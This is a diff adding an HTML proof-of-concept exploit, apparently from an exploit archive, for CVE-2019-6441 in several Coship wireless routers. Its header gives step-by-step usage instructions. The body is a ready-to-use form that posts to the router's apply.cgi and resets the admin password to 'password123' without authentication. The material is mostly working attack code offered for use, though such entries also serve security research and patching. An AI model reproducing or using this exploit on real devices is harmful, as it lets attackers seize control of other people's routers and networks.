@@ -1,0 +1,32 @@
+<!--
+# Exploit Title: Coship Wireless Router – Unauthenticated Admin Password Reset
+# Date: 15.01.2019
+# Exploit Author: Adithyan AK
+# Vendor Homepage: http://en.coship.com/
+# Category: Hardware (Wifi Router)
+# Affected Versions : Coship RT3052 - 4.0.0.48, Coship RT3050 - 4.0.0.40, Coship WM3300 - 5.0.0.54, Coship WM3300 - 5.0.0.55, Coship RT7620 - 10.0.0.49.
+# Tested on: MacOS Mojave v.10.14
+# CVE: CVE-2019-6441
+
+# Change the X.X.X.X in poc to Router Gateway address and save the below code as Exploit.html
+# Open Exploit.html with your Browser
+# Click on “Submit request”
+# Password of the admin will now be changed as "password123"
+
+# PoC :
+-->
+
+<html>
+  <!-- Change the X.X.X.X with the router's IP address -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://X.X.X.X/apply.cgi" method="POST">
+      <input type="hidden" name="page" value="regx/management/accounts.asp" />
+      <input type="hidden" name="http_username" value="admin" />
+      <input type="hidden" name="http_passwd" value="password123" />
+      <input type="hidden" name="usr_confirm_password" value="password123" />
+      <input type="hidden" name="action" value="Submit" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
